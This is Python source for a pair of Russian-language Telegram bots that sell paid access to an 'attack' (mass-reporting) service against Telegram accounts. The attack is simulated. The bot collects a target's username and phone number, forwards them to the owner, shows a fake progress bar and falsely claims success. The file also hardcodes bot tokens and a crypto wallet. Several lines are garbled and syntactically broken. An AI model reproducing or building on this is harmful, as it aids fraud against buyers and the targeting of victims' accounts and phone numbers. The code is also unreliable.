import asyncio
import logging
import random
import re
from datetime import datetime

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

# ==========================================================
# 1. ТОКЕНЫ ОБОИХ БОТОВ (в кавычках!)
# ==========================================================
BOT_TOKEN = "8626104342:AAH4vbsp2YOzcqqa7XYDz8vuFSTOquTmjfk"
ADMIN_BOT_TOKEN = "8920936859:AAHNgeDNJ-_8SLZYi8ALsJi6n19drxO0YE8"

# ==========================================================
# 2. ГЛАВНЫЙ АДМИН (Владелец)
# ==========================================================
OWNER_ID = 8883033440

# ==========================================================
# 3. СПИСКИ ПОЛЬЗОВАТЕЛЕЙ (в памяти)
# ==========================================================
ADMINS = [8883033440]
BASIC_SUBS = [8325273558]
VIP_SUBS = []
USERS = {}

def get_user_role(user_id):
    if user_id in ADMINS or user_id == OWNER_ID:
        return "admin"
    if user_id in VIP_SUBS:
        return "vip"
    if user_id in BASIC_SUBS:
        return "basic"
    return "none"

# ==========================================================
# 4. СОЗДАЁМ ОБА БОТА СРАЗУ (нужно для уведомлений)
# ==========================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

admin_bot = Bot(token=ADMIN_BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
admin_dp = Dispatcher()

async def send_report(text: str):
    """Отправить уведомление владельцу во второй бот"""
    try:
        await admin_bot.send_message(OWNER_ID, text)
    except Exception as e:
        logging.error(f"Не удалось отправить репорт: {e}")

async def notify_user(user_id: int, text: str):
    """Отправить уведомление пользователю в основной бот"""
    try:
        await bot.send_message(user_id, text)
        return True
    except Exception as e:
        logging.error(f"Не удалось отправить уведомление пользователю {user_id}: {e}")
        return False

# ==========================================================
# ОСНОВНОЙ БОТ
# ==========================================================
class AttackStates(StatesGroup):
    waiting_for_username = State()
    waiting_for_phone = State()

class BotMethodStates(StatesGroup):
    waiting_for_bot_link = State()

class CaptchaStates(StatesGroup):
    waiting_for_answer = State()

def make_progress_bar(percent, total_blocks=5):
    filled = int(percent / 100 * total_blocks)
    empty = total_blocks - filled
    return "▰" * filled + "▱" * empty

def main_menu_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Атака", callback_data="start_attack")],
            [InlineKeyboardButton(text="B@t m@tod", callback_data="bot_method")],
            [
                InlineKeyboardButton(text="Покупка", callback_data="buy_sub"),
                InlineKeyboardButton(text="Профиль", callback_data="profile")
            ],
            [
                InlineKeyboardButton(text="Наш канал", url="https://t.me/+SnBdQ2r74BBiNWQ6"),
                InlineKeyboardButton(text="Работы", url="https://t.me/+bUkMsYZDc2o3YzRl")
            ]
        ]
    )

@dp.message(CommandStart())
async def command_start_handler(message: Message, state: FSMContext) -> None:
    user = message.from_user
    
    if user.id not in USERS:
        USERS[user.id] = {
            "username": user.username or "нет",
            "first_name": user.first_name or "нет",
            "date": datetime.now().strftime("%d.%m.%Y %H:%M")
        }
        await send_report(
            f"🆕 Новый пользователь в боте!\n\n"
            f"👤 {user.first_name}\n"
            f"🔗 @{user.username if user.username else 'без юзернейма'}\n"
            f"🆔 <code>{user.id}</code>"
        )
    
    data = await state.get_data()
    if data.get("captcha_passed"):
        PHOTO_URL = "https://i.postimg.cc/BnWNfr6N/IMG-3869.jpg"
        await message.answer_photo(photo=PHOTO_URL, caption="Главное меню", reply_markup=main_menu_keyboard())
        return
    
    a = random.randint(1, 9)
    b = random.randint(1, 9)
    correct = a + b
    
    await state.update_data(captcha_answer=correct)
    await state.set_state(CaptchaStates.waiting_for_answer)
    
    await message.answer(
        f"🤖 Проверка на робота\n\n"
        f"Решите пример: <b>{a} + {b} = ?</b>\n\n"
        f"Напишите ответ сообщением."
    )

@dp.message(CaptchaStates.waiting_for_answer)
async def captcha_answer(message: Message, state: FSMContext):
    text = message.text.strip()
    data = await state.get_data()
    correct = data.get("captcha_answer")
    
    if not text.isdigit() or int(text) != correct:
        a = random.randint(1, 9)
        b = random.randint(1, 9)
        new_correct = a + b
        await state.update_data(captcha_answer=new_correct)
        await message.answer(
            f"❌ Неверно. Попробуйте снова:\n\n"
            f"Решите пример: <b>{a} + {b} = ?</b>"
        )
        return
    
    await state.update_data(captcha_passed=True, captcha_answer=None)
    await state.set_state(None)
    
    PHOTO_URL = "https://i.postimg.cc/BnWNfr6N/IMG-3869.jpg"
    await message.answer_photo(photo=PHOTO_URL, caption="Главное меню", reply_markup=main_menu_keyboard())

@dp.callback_query(F.data == "profile")
async def profile_handler(callback: CallbackQuery):
    user = callback.from_user
    username = f"@{user.username}" if user.username else "не установлен"
    role = get_user_role(user.id)
    
    if role == "admin":
        sub_text = "Админ (полный доступ)"
    elif role == "vip":
        sub_text = "Премиум (600₽)"
    elif role == "basic":
        sub_text = "Базовая (400₽)"
    else:
        sub_text = "Отсутствует"
    
    text = (
        f"👤 Профиль\n\n"
        f"Юзернейм: {username}\n"
        f"ID: <code>{user.id}</code>\n"
        f"Подписка: {sub_text}"
    )
    await callback.message.answer(text)
    await callback.answer()

@dp.callback_query(F.data == "start_attack")
async def start_attack(callback: CallbackQuery, state: FSMContext):
    role = get_user_role(callback.from_user.id)
    if role in ["admin", "vip", "basic"]:
        text = (
            "📵 Session Report · новый запрос\n"
            "Введите цель: @username или id123456.\n"
            "Пример: @durov или id987654321."
        )
        sent_msg = await callback.message.answer(text)
        await state.update_data(msg_to_delete=sent_msg.message_id)
        await state.set_state(AttackStates.waiting_for_username)
    else:
        await callback.message.answer("доступ закрыт")
    await callback.answer()

@dp.callback_query(F.data == "bot_method")
async def start_bot_method(callback: CallbackQuery, state: FSMContext):
    role = get_user_role(callback.from_user.id)
    if role in ["admin", "vip"]:
        await callback.message.answer(
            "Введите юзернейм бота (пример: @durov_bot).\n"
            "Важно: юзернейм должен заканчиваться на 'bot'."
        )
        await state.set_state(BotMethodStates.waiting_for_bot_link)
    else:
        await callback.message.answer("доступно только с премиум")
    await callback.answer()

@dp.message(BotMethodStates.waiting_for_bot_link)
async def process_bot_link(message: Message, state: FSMContext):
    text = message.text.strip()
    if not re.match(r'^@[a-zA-Z0-9_]{3,32}bot$', text):
        await message.answer(
            "не правильный ввод. Юзернейм бота должен заканчиваться на 'bot' (пример: @durov_bot).\n"
            "Попробуйте снова:"
        )
        return
    
    user = message.from_user
    await state.clear()
    await message.answer("Запрос принят. Ожидайте результат...")
    
    role = get_user_role(user.id)
    await send_report(
        f"🤖 НОВЫЙ B@t m@tod РЕПОРТ\n\n"
        f"👤 От: {user.first_name} (@{user.username if user.username else 'без юзернейма'})\n"
        f"🆔 ID: <code>{user.id}</code>\n"
        f"📊 Роль: {role_}\n"
        f"🎯 Цель (бот): <code>{text}</code>\n"
        f"🕐 {datetime.nowusername().strftime('%d.%m.%Y)
 %H:%M')}"
    )
    
   async await asyn defcio.sleep(120)
    await message.answer(" processрепорт доставлен")

@dp.callback_query(F.data == "buy_sub")
async def buy_sub(callback: CallbackQuery):
    pay_keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="400 рублей", url="https://t.me/yuopoma")],
            [InlineKeyboardButton(text="Премиум 600 руб", url="https://t.me/yuopoma")],
            [InlineKeyboardButton(text="Крипта", callback_data="crypto_pay")]
        ]
    )
    await callback.message.answer("Выберите подписку:", reply_markup=pay_keyboard)
    await callback.answer()

@dp.callback_query(F.data == "crypto_pay")
async def crypto_pay(callback: CallbackQuery):
    text = (
        "Оплата криптой:\n\n"
        "Адрес кошелька:\n"
        "<code>UQBM7eVXH48ATH6S7Jb_MDECQiveaoWN-UdGsXAi47XN2oVD</code>\n\n"
        "после оплаты напишите @yuopoma"
    )
    await callback.message.answer(text)
    await callback.answer()

@dp.message(AttackStates.waiting_for_username(message: Message, state: FSMContext):
    text = message.text.strip()
    is_valid_username = re.match(r'^@[a-zA-Z0-9_]{4,32}$', text)
    is_valid_id = re.match(r'^id\d+$', text)
    if not (is_valid_username or is_valid_id):
        await message.answer(
            "не правильный ввод\n"
            "Введите цель: @username или id123456.\n"
            "Пример: @durov или id987654321."
        )
        return
    data = await state.get_data()
    msg_to_delete = data.get("msg_to_delete")
    if msg_to_delete:
        try:
            await message.bot.delete_message(chat_id=message.chat.id, message_id=msg_to_delete)
        except Exception:
            pass
    await state.update_data(username=text)
    await message.answer("Теперь введите номер телефона цели (пример: +79999999999):")
    await state.set_state(AttackStates.waiting_for_phone)

@dp.message(AttackStates.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    text = message.text.strip()
    allowed_chars = re.match(r'^[\d\s\+\-\(\)]+$', text)
    if not allowed_chars:
        await message.answer("не правильный ввод\nВведите номер телефона цели (пример: +79999999999):")
        return
    digits_only = re.sub(r'\D', '', text)
    if not (10 <= len(digits_only) <= 15):
        await message.answer("не правильный ввод\nВведите номер телефона цели (пример: +79999999999):")
        return
    
    data = await state.get_data()
    target_username = data.get("username", "неизвестно")
    user = message.from_user
    role = get_user_role(user.id)
    
    phone_display = text if text else "не указан"
    
    await state.update_data(phone=text)
    await state.clear()
    await message.answer("Атака запущена. Ожидайте результат...")
    
    await send_report(
        f"📵 НОВЫЙ РЕПОРТ · АТАКА\n\n"
        f"👤 Кто запустил: {user.first_name}\n"
        f"🔗 Юзернейм: @{user.username if user.username else 'без юзернейма'}\n"
        f"🆔 ID: <code>{user.id}</code>\n"
        f"📊 Роль: {role}\n"
        f"───────────────\n"
        f"🎯 Цель: <code>{target_username}</code>\n"
        f"📞 Номер: <code>{phone_display}</code>\n"
        f"───────────────\n"
        f"🕐 {datetime.now().strftime('%d.%m.%Y %H:%M')}"
    )
    
    progress_msg = await message.answer(
        "📵 Session Report\n⏳ Проверяю номер и соединение\n▰▱▱▱▱  10%\nПопытка: 1/5"
    )
    total_steps = 10
    for i in range(2, total_steps + 1):
        await asyncio.sleep(12)
        percent = int(i / total_steps * 100)
        bar = make_progress_bar(percent)
        attempt = min((i - 1) // 2 + 1, 5)
        new_text = (
            f"📵 Session Report\n"
            f"⏳ Проверяю номер и соединение\n"
            f"{bar}  {percent}%\n"
            f"Попытка: {attempt}/5"
        )
        try:
            await progress_msg.edit_text(new_text)
        except Exception:
            pass
    await asyncio.sleep(12)
    await message.answer("📵 Session Report\n✅ Репорт успешно дошел")

# ==========================================================
# АДМИН-БОТ (команды)
# ==========================================================
@admin_dp.message(CommandStart())
async def admin_start(message: Message):
    if message.from_user.id != OWNER_ID:
        await message.answer("⛔ У вас нет доступа к этому боту.")
        return
    await message.answer(
        "👋 Привет, владелец!\n\n"
        "📩 Сюда приходят все репорты пользователей.\n\n"
        "Команды:\n"
        "/users — список всех пользователей\n"
        "/add 123456789 — добавить админа\n"
        "/remove 123456789 — снять админа\n"
        "/addbasic 123456789 — выдать базовую (400р)\n"
        "/removebasic 123456789 — снять базовую\n"
        "/addvip 123456789 — выдать VIP (600р)\n"
        "/removevip 123456789 — снять VIP\n"
        "/listsubs — список всех подписок"
    )

@admin_dp.message(Command("users"))
async def admin_users(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    if not USERS:
        await message.answer("Пока никто не запускал бота.")
        return
    text = f"👥 Всего пользователей: {len(USERS)}\n\n"
    for uid, info in USERS.items():
        role = get_user_role(uid)
        if role == "admin":
            tag = "👑 Админ"
        elif role == "vip":
            tag = "💎 VIP"
        elif role == "basic":
            tag = "💳 База"
        else:
            tag = "—"
        uname = f"@{info['username']}" if info['username'] != "нет" else "без юзернейма"
        text += f"• {info['first_name']} ({uname})\n"
        text += f"  ID: <code>{uid}</code>\n"
        text += f"  Подписка: {tag}\n"
        text += f"  Дата: {info['date']}\n\n"
    if len(text) > 4000:
        text = text[:4000] + "\n\n... (обрезано)"
    await message.answer(text)

@admin_dp.message(Command("add"))
async def admin_add(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        await message.answer("❌ Использование: /add 123456789")
        return
    new_id = int(args[1])
    if new_id in ADMINS:
        await message.answer(f"⚠️ Уже админ.")
        return
    ADMINS.append(new_id)
    await message.answer(f"✅ {new_id} добавлен в админы.")

@admin_dp.message(Command("remove"))
async def admin_remove(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        await message.answer("❌ Использование: /remove 123456789")
        return
    rem_id = int(args[1])
    if rem_id == OWNER_ID:
        await message.answer("❌ Нельзя удалить владельца.")
        return
    if rem_id not in ADMINS:
        await message.answer(f"⚠️ Нет в админах.")
        return
    ADMINS.remove(rem_id)
    await message.answer(f"✅ {rem_id} снят с админов.")

# --- БАЗОВАЯ ПОДПИСКА (400р) ---
@admin_dp.message(Command("addbasic"))
async def add_basic(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        await message.answer("❌ Использование: /addbasic 123456789")
        return
    new_id = int(args[1])
    if new_id in BASIC_SUBS:
        await message.answer(f"⚠️ Уже есть база.")
        return
    
    # Если у человека VIP — снимаем его
    if new_id in VIP_SUBS:
        VIP_SUBS.remove(new_id)
    
    BASIC_SUBS.append(new_id)
    
    # Уведомляем пользователя
    sent = await notify_user(
        new_id,
        "🎉 Вам выдана подписка!\n\n"
        "💳 Тариф: Базовая (400₽)\n\n"
        "Теперь вам доступны кнопки «Атака».\n"
        "Приятного использования!"
    )
    
    if sent:
        await message.answer(f"✅ {new_id} получил Базу (400р). Уведомление отправлено.")
    else:
        await message.answer(f"✅ {new_id} получил Базу (400р). ⚠️ Не удалось отправить уведомление (возможно, не запускал бота).")

@admin_dp.message(Command("removebasic"))
async def remove_basic(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        await message.answer("❌ Использование: /removebasic 123456789")
        return
    rem_id = int(args[1])
    if rem_id not in BASIC_SUBS:
        await message.answer(f"⚠️ Нет базы.")
        return
    BASIC_SUBS.remove(rem_id)
    
    # Уведомляем пользователя
    sent = await notify_user(
        rem_id,
        "⚠️ Ваша подписка была снята.\n\n"
        "💳 Тариф: Базовая (400₽)\n\n"
        "Если это ошибка — напишите @yuopoma"
    )
    
    if sent:
        await message.answer(f"✅ База снята с {rem_id}. Уведомление отправлено.")
    else:
        await message.answer(f"✅ База снята с {rem_id}. ⚠️ Уведомление не доставлено.")

# --- VIP ПОДПИСКА (600р) ---
@admin_dp.message(Command("addvip"))
async def add_vip(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        await message.answer("❌ Использование: /addvip 123456789")
        return
    new_id = int(args[1])
    if new_id in VIP_SUBS:
        await message.answer(f"⚠️ Уже VIP.")
        return
    
    # Если у человека База — снимаем её
    if new_id in BASIC_SUBS:
        BASIC_SUBS.remove(new_id)
    
    VIP_SUBS.append(new_id)
    
    # Уведомляем пользователя
    sent = await notify_user(
        new_id,
        "💎 Вам выдана VIP подписка!\n\n"
        "💎 Тариф: Премиум (600₽)\n\n"
        "Теперь вам доступны:\n"
        "• Кнопка «Атака»\n"
        "• Кнопка «B@t m@tod»\n\n"
        "Приятного использования!"
    )
    
    if sent:
        await message.answer(f"✅ {new_id} получил VIP (600р). Уведомление отправлено.")
    else:
        await message.answer(f"✅ {new_id} получил VIP (600р). ⚠️ Не удалось отправить уведомление (возможно, не запускал бота).")

@admin_dp.message(Command("removevip"))
async def remove_vip(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        await message.answer("❌ Использование: /removevip 123456789")
        return
    rem_id = int(args[1])
    if rem_id not in VIP_SUBS:
        await message.answer(f"⚠️ Нет VIP.")
        return
    VIP_SUBS.remove(rem_id)
    
    # Уведомляем пользователя
    sent = await notify_user(
        rem_id,
        "⚠️ Ваша VIP подписка была снята.\n\n"
        "💎 Тариф: Премиум (600₽)\n\n"
        "Если это ошибка — напишите @yuopoma"
    )
    
    if sent:
        await message.answer(f"✅ VIP снят с {rem_id}. Уведомление отправлено.")
    else:
        await message.answer(f"✅ VIP снят с {rem_id}. ⚠️ Уведомление не доставлено.")

@admin_dp.message(Command("listsubs"))
async def list_subs(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    text = (
        f"👥 Админы: {ADMINS}\n\n"
        f"💳 База (400р): {BASIC_SUBS}\n\n"
        f"💎 VIP (600р): {VIP_SUBS}"
    )
    await message.answer(text)

# ==========================================================
# ЗАПУСК ОБОИХ БОТОВ
# ==========================================================
async def main() -> None:
    logging.basicConfig(level=logging.INFO)
    await asyncio.gather(
        dp.start_polling(bot),
        admin_dp.start_polling(admin_bot)
    )

if __name__ == "__main__":
    asyncio.run(main())